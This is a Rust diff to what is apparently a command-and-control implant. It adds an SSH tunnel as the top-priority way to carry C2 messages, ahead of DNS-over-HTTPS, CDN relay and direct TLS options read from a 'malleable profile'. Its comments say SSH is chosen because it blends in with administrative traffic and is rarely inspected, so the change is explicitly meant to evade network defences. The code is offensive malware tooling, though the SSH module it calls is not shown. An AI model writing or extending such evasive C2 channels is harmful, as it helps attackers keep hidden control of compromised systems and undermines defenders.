@@ -34,7 +34,8 @@ use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 #[cfg(any(
     not(feature = "forward-secrecy"),
     feature = "doh-transport",
-    feature = "http-transport"
+    feature = "http-transport",
+    feature = "ssh-transport"
 ))]
 use common::CryptoSession;
 use common::{Message, Transport};
@@ -123,9 +124,10 @@ fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
 /// runtime malleable-profile configuration.
 ///
 /// Priority order:
-///   1. DoH transport  (`doh-transport`  feature + `dns_over_https = true`)
-///   2. HTTP transport (`http-transport` feature + `cdn_relay = true`)
-///   3. Direct TLS connection (always-available fallback)
+///   1. SSH transport  (`ssh-transport`  feature + `ssh_host` configured)
+///   2. DoH transport  (`doh-transport`  feature + `dns_over_https = true`)
+///   3. HTTP transport (`http-transport` feature + `cdn_relay = true`)
+///   4. Direct TLS connection (always-available fallback)
 ///
 /// Extracting this logic out of [`connect_once`] makes the transport selection
 /// reusable: any startup path (outbound-c, future inbound mode, tests) can
@@ -136,10 +138,33 @@ pub async fn build_outbound_transport(
     secret: &str,
     cert_fp: Option<&str>,
 ) -> Result<Box<dyn Transport + Send>> {
-    #[cfg(any(feature = "doh-transport", feature = "http-transport"))]
+    #[cfg(any(
+        feature = "ssh-transport",
+        feature = "doh-transport",
+        feature = "http-transport"
+    ))]
     {
         match crate::config::load_config() {
             Ok(cfg) => {
+                // SSH transport: tunnel C2 messages through an SSH session
+                // channel.  Highest priority because SSH blends in with
+                // legitimate administrative traffic and is rarely DPI'd.
+                // Requires ssh_host (and ssh_username + ssh_auth) in the
+                // malleable profile.
+                #[cfg(feature = "ssh-transport")]
+                if cfg.malleable_profile.ssh_host.as_deref().filter(|s| !s.is_empty()).is_some() {
+                    info!(
+                        "ssh-transport: ssh_host configured ({}); switching to SshTransport",
+                        cfg.malleable_profile.ssh_host.as_deref().unwrap_or("?")
+                    );
+                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
+                    return Ok(Box::new(
+                        crate::c2_ssh::SshTransport::new(&cfg.malleable_profile, session)
+                            .await
+                            .map_err(|e| anyhow!("SshTransport init failed: {e}"))?,
+                    ));
+                }
+
                 // DoH transport: tunnel C2 messages through DNS TXT records sent
                 // to a public DoH resolver.  Requires a server-side DoH-to-C2
                 // bridge; the bridge URL must be set in `doh_server_url` in the
